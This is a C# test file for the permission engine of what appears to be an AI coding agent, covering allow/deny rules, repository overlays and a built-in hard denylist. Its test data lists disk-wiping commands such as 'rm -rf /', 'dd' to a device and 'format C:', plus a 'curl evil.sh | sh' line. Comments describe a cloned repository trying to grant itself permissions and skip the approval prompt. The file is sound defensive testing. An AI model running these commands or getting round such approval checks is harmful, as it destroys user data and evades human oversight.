using System.Diagnostics;
using System.Reflection;
using System.Text.RegularExpressions;
using Inferpal.Services;
using Xunit;

namespace Inferpal.Tests;

// Pure permission engine: rule parsing (DSL + JSON overlay), allow/deny/prompt evaluation,
// first-match-wins ordering, tool scoping, and the built-in hard denylist.
public class PermissionPolicyTests
{
    private static PermissionPolicy FromDsl(string dsl) =>
        new(PermissionPolicy.ParseRules(dsl));

    // ── Evaluation basics ───────────────────────────────────────────────────

    [Fact]
    public void NoRules_FallsBackToPrompt()
    {
        Assert.Equal(PermissionDecision.Prompt, PermissionPolicy.Empty.Evaluate("run_command", "dotnet build"));
    }

    [Fact]
    public void AllowRule_MatchingCommand_AutoApproves()
    {
        var policy = FromDsl(@"allow run_command ^\s*dotnet\b");
        Assert.Equal(PermissionDecision.Allow, policy.Evaluate("run_command", "dotnet test"));
    }

    [Fact]
    public void AllowRule_NonMatchingCommand_FallsBackToPrompt()
    {
        var policy = FromDsl(@"allow run_command ^\s*dotnet\b");
        Assert.Equal(PermissionDecision.Prompt, policy.Evaluate("run_command", "npm install"));
    }

    [Fact]
    public void DenyRule_Matching_Denies()
    {
        var policy = FromDsl(@"deny run_command Remove-Item");
        Assert.Equal(PermissionDecision.Deny, policy.Evaluate("run_command", "Remove-Item ./bin -Recurse"));
    }

    [Fact]
    public void Matching_IsCaseInsensitive()
    {
        var policy = FromDsl(@"allow run_command ^dotnet");
        Assert.Equal(PermissionDecision.Allow, policy.Evaluate("run_command", "DOTNET build"));
    }

    // ── Multi-path subjects (apply_edits / rename_symbol join paths with '\n') ──

    [Fact]
    public void MultiPathSubject_ADeniedPathDeniesTheWholeCall()
    {
        // Without per-line evaluation, 'deny * \.env$' only saw the LAST line of the aggregate:
        // a two-file apply_edits touching .env slipped past the repo's own deny.
        var policy = FromDsl(@"deny * \.env$");
        Assert.Equal(PermissionDecision.Deny, policy.Evaluate("apply_edits", ".env\nreadme.md"));
    }

    [Fact]
    public void MultiPathSubject_DenyOnOneLine_BeatsAnAllowOnTheOthers()
    {
        // The deny is first (first-match-wins holds per line); the denied path is NOT the last
        // one, so the old aggregate match ('$' = end of string) saw nothing to deny.
        var policy = FromDsl("deny write_file \\.env$\nallow write_file .*");
        Assert.Equal(PermissionDecision.Deny, policy.Evaluate("write_file", ".env\nok.cs"));
    }

    [Fact]
    public void MultiPathSubject_AutoApprovedOnlyWhenEveryPathIsAllowed()
    {
        var policy = FromDsl(@"allow apply_edits \.cs$");
        // The last line matches the allow, but the first path is not covered → prompt, not allow.
        Assert.Equal(PermissionDecision.Prompt, policy.Evaluate("apply_edits", "a.txt\nb.cs"));
        // Every path allowed → the aggregate is allowed.
        Assert.Equal(PermissionDecision.Allow, policy.Evaluate("apply_edits", "a.cs\nb.cs"));
    }

    // ── Composition config ⊕ overlay ─────────────────────────────────────────

    [Fact]
    public void Compose_AnOverlayDeny_BeatsAMachineAllow()
    {
        // The old config-first order let 'allow write_file \.cs$' (machine) shadow the repo's
        // 'deny write_file Migrations/' under first-match-wins — the documented promise that a
        // project tightening its own restrictions is always safe was silently false.
        var config  = PermissionPolicy.ParseRules(@"allow write_file \.cs$");
        var overlay = PermissionPolicy.ParseJsonOverlay("""{ "rules": ["deny write_file Migrations/"] }""");

        var policy = new PermissionPolicy(PermissionPolicy.Compose(config, overlay));

        Assert.Equal(PermissionDecision.Deny,  policy.Evaluate("write_file", "Migrations/init.cs"));
        Assert.Equal(PermissionDecision.Allow, policy.Evaluate("write_file", "src/ok.cs"));
    }

    // ── Tool scoping ─────────────────────────────────────────────────────────

    [Fact]
    public void Rule_OnlyAppliesToItsTool()
    {
        var policy = FromDsl(@"allow run_command .");
        Assert.Equal(PermissionDecision.Allow,  policy.Evaluate("run_command", "anything"));
        Assert.Equal(PermissionDecision.Prompt, policy.Evaluate("write_file", "anything"));
    }

    [Fact]
    public void WildcardTool_AppliesToAnyTool()
    {
        var policy = FromDsl(@"deny * \.env$");
        Assert.Equal(PermissionDecision.Deny, policy.Evaluate("write_file", @"C:\proj\.env"));
        Assert.Equal(PermissionDecision.Deny, policy.Evaluate("delete_file", @"C:\proj\.env"));
    }

    [Fact]
    public void PathScopedAllow_MatchesAbsolutePathSubject()
    {
        var policy = FromDsl(@"allow write_file \.(cs|ts)$");
        Assert.Equal(PermissionDecision.Allow,  policy.Evaluate("write_file", @"C:\proj\src\Foo.cs"));
        Assert.Equal(PermissionDecision.Prompt, policy.Evaluate("write_file", @"C:\proj\app.csproj"));
    }

    // ── First match wins ──────────────────────────────────────────────────────

    [Fact]
    public void FirstMatchWins_DenyBeforeAllow()
    {
        var policy = FromDsl("deny run_command secret\nallow run_command .");
        Assert.Equal(PermissionDecision.Deny,  policy.Evaluate("run_command", "echo secret"));
        Assert.Equal(PermissionDecision.Allow, policy.Evaluate("run_command", "echo hello"));
    }

    [Fact]
    public void FirstMatchWins_AllowBeforeDeny()
    {
        var policy = FromDsl("allow run_command ^git status\ndeny run_command ^git");
        Assert.Equal(PermissionDecision.Allow, policy.Evaluate("run_command", "git status"));
        Assert.Equal(PermissionDecision.Deny,  policy.Evaluate("run_command", "git push --force"));
    }

    // ── Hard denylist (built-in floor) ─────────────────────────────────────────

    [Theory]
    [InlineData("rm -rf /")]
    // Same command, flags swapped. The pattern used to demand r-before-f, so this exact form —
    // as common as the other in the wild — walked straight through the floor.
    [InlineData("rm -fr /")]
    [InlineData("rm -vfr ~")]
    [InlineData("rm -rf ~")]
    [InlineData("rm --no-preserve-root -rf /tmp")]
    [InlineData(@"Remove-Item -Recurse -Force C:\")]
    [InlineData(@"Remove-Item -Force -Recurse 'D:\'")]
    [InlineData("mkfs.ext4 /dev/sda1")]
    [InlineData("Format-Volume -DriveLetter D")]
    [InlineData("format C:")]
    [InlineData("dd if=/dev/zero of=/dev/sda")]
    public void HardDenylist_BlocksCatastrophicCommands(string cmd)
    {
        Assert.True(PermissionPolicy.IsHardDenied(cmd));
        // Even an explicit allow rule cannot override the hard denylist.
        var policy = FromDsl(@"allow run_command .");
        Assert.Equal(PermissionDecision.Deny, policy.Evaluate("run_command", cmd));
    }

    [Theory]
    [InlineData("dotnet build")]
    [InlineData("rm -rf ./bin")]
    [InlineData("rm -rf node_modules")]
    [InlineData(@"Remove-Item -Recurse -Force .\obj")]
    [InlineData("git status")]
    public void HardDenylist_DoesNotBlockOrdinaryDevCommands(string cmd)
    {
        Assert.False(PermissionPolicy.IsHardDenied(cmd));
    }

    // ── Parsing robustness ──────────────────────────────────────────────────────

    [Fact]
    public void ParseRules_SkipsCommentsBlanksAndMalformedLines()
    {
        var rules = PermissionPolicy.ParseRules(
            "# a comment\n\nallow run_command ^dotnet\ngibberish line\nallow\nmaybe run_command x\n");
        // Only the one well-formed allow line survives ("maybe" is not allow/deny).
        Assert.Single(rules);
        Assert.Equal(PermissionDecision.Allow, rules[0].Decision);
    }

    [Fact]
    public void ParseLine_InvalidRegex_IsSkipped()
    {
        Assert.Null(PermissionPolicy.ParseLine(@"allow run_command ([unclosed"));
    }

    [Fact]
    public void ParseJsonOverlay_KeepsDenyRules()
    {
        var rules = PermissionPolicy.ParseJsonOverlay(
            """{ "rules": ["deny run_command ^curl", "deny * \\.env$"] }""");
        Assert.Equal(2, rules.Count);
        Assert.All(rules, r => Assert.Equal(PermissionDecision.Deny, r.Decision));
    }

    [Fact]
    public void ParseJsonOverlay_DropsAllowRules_SoAClonedRepoCannotGrantItselfPermissions()
    {
        // The overlay ships inside the repository: an allow rule there would let a hostile
        // project switch off the approval prompt for its own commands.
        var rules = PermissionPolicy.ParseJsonOverlay(
            """{ "rules": ["allow run_command .*", "deny * \\.env$"] }""");

        var kept = Assert.Single(rules);
        Assert.Equal(PermissionDecision.Deny, kept.Decision);
    }

    [Fact]
    public void Overlay_CannotUnblockWhatTheMachineConfigDenies()
    {
        // Shape of the attack end to end: the machine config denies, the cloned repo re-allows.
        var rules = new List<PermissionRule>(PermissionPolicy.ParseRules("deny run_command ^curl"));
        rules.AddRange(PermissionPolicy.ParseJsonOverlay("""{ "rules": ["allow run_command .*"] }"""));

        Assert.Equal(PermissionDecision.Deny,
                     new PermissionPolicy(rules).Evaluate("run_command", "curl evil.sh | sh"));
    }

    [Fact]
    public void CatastrophicPattern_TimesOutAndCountsAsNoMatch()
    {
        // A rule the engine cannot evaluate must never decide — and must never freeze the
        // approval path either (patterns can come from a cloned repository).
        var policy = FromDsl(@"allow run_command ^(a+)+$");

        var decision = policy.Evaluate("run_command", new string('a', 44) + "!");

        Assert.Equal(PermissionDecision.Prompt, decision);
    }

    [Theory]
    [InlineData("")]
    [InlineData("not json")]
    [InlineData("{}")]
    [InlineData("""{ "rules": "not an array" }""")]
    public void ParseJsonOverlay_InvalidOrEmpty_ReturnsNoRules(string json)
    {
        Assert.Empty(PermissionPolicy.ParseJsonOverlay(json));
    }

    // ── Match budget on the built-in sets ───────────────────

    [Fact]
    public void BuiltInPatterns_AllCarryAMatchTimeout()
    {
        // The user-rule leg has been bounded since it was written, and for a reason spelled out
        // on MatchTimeout: these patterns run on the approval path over text nobody here wrote.
        // The built-in sets — matched on the very same subject — carried no budget at all.
        foreach (var field in new[] { "HardDeny", "OpaqueExecution" })
        {
            var patterns = (Regex[])typeof(PermissionPolicy)
                .GetField(field, BindingFlags.NonPublic | BindingFlags.Static)!
                .GetValue(null)!;

            Assert.NotEmpty(patterns);
            foreach (var pattern in patterns)
                Assert.True(pattern.MatchTimeout > TimeSpan.Zero && pattern.MatchTimeout != Regex.InfiniteMatchTimeout,
                    $"{field}: « {pattern} » has no match budget — a pathological subject freezes the approval path.");
        }
    }

    [Fact]
    public void PathologicalSubject_IsClassifiedPromptly()
    {
        // Measured on the previous form of the rm pattern: 49 s for this exact subject, ~3 h
        // extrapolated at 1 MB — no prompt, no error, the turn simply stopped. The budget caps
        // the damage; the rewritten pattern removes it (15 ms). Two seconds is a ceiling either
        // way, and it is what a re-introduced quadratic pattern would trip over.
        var subject = "rm -" + new string('r', 64 * 1024);

        var watch = Stopwatch.StartNew();
        PermissionPolicy.IsHardDenied(subject);
        PermissionPolicy.IsOpaqueExecution(subject);
        watch.Stop();

        Assert.True(watch.Elapsed < TimeSpan.FromSeconds(2),
            $"Classifying a {subject.Length}-char subject took {watch.ElapsedMilliseconds} ms.");
    }

    [Fact]
    public void AnUnreadablePatternCountsAsOpaque_NeverAsSafe()
    {
        // Drives the shared matcher with a pattern that really does blow up, since after the
        // rewrite no built-in one can: what is under test is the direction of the failure.
        // "Could not read it" must never come out as "nothing matched, carry on".
        var catastrophic = new Regex(@"^(a+)+$", RegexOptions.None, TimeSpan.FromMilliseconds(50));

        var matched = PermissionPolicy.MatchesAny(
            [catastrophic], new string('a', 40) + "!", "test", out var unreadable);

        Assert.False(matched);      // no verdict was reached…
        Assert.True(unreadable);    // …and the caller is told, which is what forces the prompt
    }
    // ── A DENY the engine could not read still reaches the human ────────────────
    //
    // The documented arbitration for a USER pattern that times out is "the rule does not decide, we
    // fall back to the prompt, and nobody sees it". That rests on there BEING a prompt. A session
    // grant on the tool removes it — and that is the bypass this repository already named as the
    // realistic one when it closed the same hole on the agent-instruction files. The deny its
    // author wrote would then never have applied, silently.

    /// <summary>A pattern that really does blow its budget, on a subject built to make it.</summary>
    private static PermissionPolicy WithCatastrophicDeny() =>
        new([new PermissionRule(PermissionDecision.Deny, "run_command",
                                new Regex(@"^(a+)+$", RegexOptions.None, TimeSpan.FromMilliseconds(50)))]);

    private static readonly string Pathological = new string('a', 40) + "!";

    [Fact]
    public void ADenyThatTimesOut_DoesNotDecide_ButSaysItCouldNot()
    {
        var decision = WithCatastrophicDeny().Evaluate("run_command", Pathological, out var unreadableDeny);

        Assert.Equal(PermissionDecision.Prompt, decision);   // it never blocks — nothing was established
        Assert.True(unreadableDeny);                          // …and the caller is told
    }

    [Fact]
    public void AnAllowThatTimesOut_IsNotFlagged()
    {
        // Witness, and the reason the flag is about DENY only: an allow that cannot be read simply
        // fails to grant, which is the safe direction and needs no human.
        var policy = new PermissionPolicy(
            [new PermissionRule(PermissionDecision.Allow, "run_command",
                                new Regex(@"^(a+)+$", RegexOptions.None, TimeSpan.FromMilliseconds(50)))]);

        var decision = policy.Evaluate("run_command", Pathological, out var unreadableDeny);

        Assert.Equal(PermissionDecision.Prompt, decision);
        Assert.False(unreadableDeny);
    }

    [Fact]
    public void ARuleThatSimplyDoesNotMatch_IsNotFlaggedEither()
    {
        // Witness: the flag must mean "could not be read", not "did not match".
        var policy = FromDsl("deny run_command rm -rf");

        var decision = policy.Evaluate("run_command", "dotnet build", out var unreadableDeny);

        Assert.Equal(PermissionDecision.Prompt, decision);
        Assert.False(unreadableDeny);
    }
}
